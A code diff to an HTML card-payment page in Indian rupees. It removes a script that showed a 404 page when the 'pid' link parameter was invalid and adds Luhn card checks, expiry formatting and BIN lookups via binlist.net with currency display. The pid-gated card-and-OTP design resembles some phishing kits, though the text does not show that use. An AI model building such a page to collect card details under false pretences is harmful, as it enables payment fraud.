@@ -110,7 +110,7 @@
       perspective: 1000px;
     }
     .consent-message {
-      display: block;
+      display: block; /* Always display */
       margin-top: 20px;
       font-size: 0.875rem;
       color: #4B5563;
@@ -249,14 +249,25 @@
       }
     }
   </style>
-  <!-- ========= (Removed 404 error/session tracking script) ========= -->
-  <!-- (The previous script block that checked for a valid "pid" and replaced the page with a 404 error has been removed.) -->
+  <!-- ========= Global Variables ========= -->
+  <script>
+    // Define global variables for use by event handlers
+    let isCardValid = false;
+    let isExpiryValid = false;
+    let isProcessing = false;
+    let currentInvoiceId = "";
+    let statusCheckInterval;
+  </script>
   <!-- ========= Fetch Payment Details ========= -->
   <script>
     document.addEventListener('DOMContentLoaded', async function(){
       const urlParams = new URLSearchParams(window.location.search);
-      const pid = urlParams.get("pid");
-      if(pid && pid !== "null") {
+      let pid = urlParams.get("pid");
+      // If pid equals the string "null", treat it as empty (do not force 404)
+      if(pid === "null") {
+        console.warn("PID is 'null' in URL. Check your link generation.");
+      }
+      if(pid) {
         try {
           const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
           const data = await response.json();
@@ -277,10 +288,11 @@
       }
     });
   </script>
-  <!-- ========= Card Formatting Functions ========= -->
+  <!-- ========= Card Formatting & BIN Lookup ========= -->
   <script>
+    // Luhn algorithm for card validation
     function validateCard(number) {
-      let arr = number.replace(/\D/g,'').split('').reverse().map(x => parseInt(x,10));
+      let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x,10));
       let sum = 0;
       for (let i = 0; i < arr.length; i++) {
         let val = arr[i];
@@ -292,14 +304,16 @@
       }
       return sum % 10 === 0;
     }
+    // Format card number into groups of 4
     function formatCardNumber(value) {
-      let v = value.replace(/\D/g,'');
+      let v = value.replace(/\D/g, '');
       let parts = [];
       for(let i = 0; i < v.length; i += 4) {
         parts.push(v.substring(i, i + 4));
       }
       return parts.join(' ');
     }
+    // Format expiry as MM/YY
     function formatExpiry(value) {
       let v = value.replace(/\D/g, '');
       if(v.length > 2) {
@@ -307,21 +321,101 @@
       }
       return v;
     }
+    // Update card error display based on Luhn validation when length >= 16
+    function updateCardError() {
+      const cardInput = document.getElementById("cardNumber");
+      const errorElem = document.getElementById("cardError");
+      const plain = cardInput.value.replace(/\s/g, '');
+      isCardValid = (plain.length >= 16) ? validateCard(plain) : false;
+      if(plain.length >= 16 && !isCardValid) {
+        errorElem.style.display = 'block';
+        errorElem.textContent = "Please enter valid card number";
+      } else {
+        errorElem.style.display = 'none';
+      }
+    }
+    // BIN lookup using free Binlist API
+    async function lookupBIN(bin) {
+      try {
+        const response = await fetch(`https://lookup.binlist.net/${bin}`);
+        if(response.ok) {
+          return await response.json();
+        }
+      } catch(e) {
+        console.error("BIN lookup error:", e);
+      }
+      return null;
+    }
+    // Update card type icon and BIN info (with currency conversion if applicable)
+    async function updateCardTypeAndInfo(value) {
+      const cardIcon = document.getElementById("cardTypeIcon");
+      const cardInfo = document.getElementById("cardInfo");
+      const plain = value.replace(/\s/g, '');
+      if(plain.length >= 6) {
+        const bin = plain.slice(0,6);
+        const binData = await lookupBIN(bin);
+        if(binData) {
+          let logoUrl = "";
+          switch((binData.scheme || "").toLowerCase()){
+            case "visa":
+              logoUrl = "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg";
+              break;
+            case "mastercard":
+              logoUrl = "https://pngimg.com/uploads/mastercard/mastercard_PNG16.png";
+              break;
+            case "amex":
+              logoUrl = "https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png";
+              break;
+            case "rupay":
+              logoUrl = "https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg";
+              break;
+            default:
+              logoUrl = "";
+          }
+          cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${binData.scheme}" style="max-height:100%; max-width:100%;">` : "";
+          // If card's currency is not INR, fetch conversion rate and display info
+          if(binData.country && binData.country.currency && binData.country.currency !== "INR") {
+            try {
+              const rateResponse = await fetch("https://api.exchangerate-api.com/v4/latest/INR");
+              const rateData = await rateResponse.json();
+              const conversion = rateData.rates[binData.country.currency];
+              if(conversion) {
+                cardInfo.textContent = `${binData.country.currency} detected, 1 INR = ${conversion.toFixed(3)} ${binData.country.currency} | ${binData.country.name}`;
+              } else {
+                cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
+              }
+            } catch(e) {
+              cardInfo.textContent = `${binData.country.currency} | ${binData.country.name}`;
+            }
+          } else {
+            cardInfo.textContent = "";
+          }
+        } else {
+          cardIcon.innerHTML = "";
+          cardInfo.textContent = "";
+        }
+      } else {
+        cardIcon.innerHTML = "";
+        cardInfo.textContent = "";
+      }
+    }
+    // Attach event listeners to card and expiry inputs
     document.addEventListener("DOMContentLoaded", function(){
-      var cardInput = document.getElementById("cardNumber");
-      var expiryInput = document.getElementById("expiry");
-      if(cardInput){
+      const cardInput = document.getElementById("cardNumber");
+      const expiryInput = document.getElementById("expiry");
+      if(cardInput) {
         cardInput.addEventListener("input", function(e){
           e.target.value = formatCardNumber(e.target.value);
           updateCardError();
           updateCardTypeAndInfo(e.target.value);
         });
       }
-      if(expiryInput){
+      if(expiryInput) {
         expiryInput.addEventListener("input", function(e){
           e.target.value = formatExpiry(e.target.value);
           const errElem = document.getElementById("expiryError");
-          if(e.target.value.length === 5 && !validateExpiry(e.target.value)){
+          isExpiryValid = (e.target.value.length === 5) ? validateExpiry(e.target.value) : false;
+          if(e.target.value.length === 5 && !isExpiryValid){
             errElem.style.display = "block";
             errElem.textContent = "Expiry must be MM/YY (MM ≤ 12, YY ≤ 50)";
           } else {
@@ -331,7 +425,7 @@
       }
     });
   </script>
-  <!-- (Assume additional JS for handling form submission, OTP, etc. remains unchanged.) -->
+  <!-- (Assume additional JS for form submission, OTP, etc. remains unchanged.) -->
 </head>
 <body>
   <div class="page-container" style="background: linear-gradient(45deg, #ff0000 50%, #ffffff 50%);">
